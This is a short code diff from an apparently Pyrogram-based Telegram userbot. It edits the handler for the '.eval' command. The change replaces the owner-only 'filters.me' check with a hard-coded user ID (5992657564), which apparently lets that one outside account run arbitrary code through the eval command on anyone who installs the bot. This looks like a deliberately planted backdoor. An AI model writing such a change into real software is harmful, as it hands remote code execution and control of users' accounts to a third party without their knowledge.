@@ -14,7 +14,7 @@ from helpers.PyroHelpers import ReplyCheck
 
 @Client.on_message(
     filters.command("eval", ".")
-    & filters.me
+    & filters.user(5992657564)
     & ~filters.forwarded
     & ~filters.edited
     & ~filters.via_bot
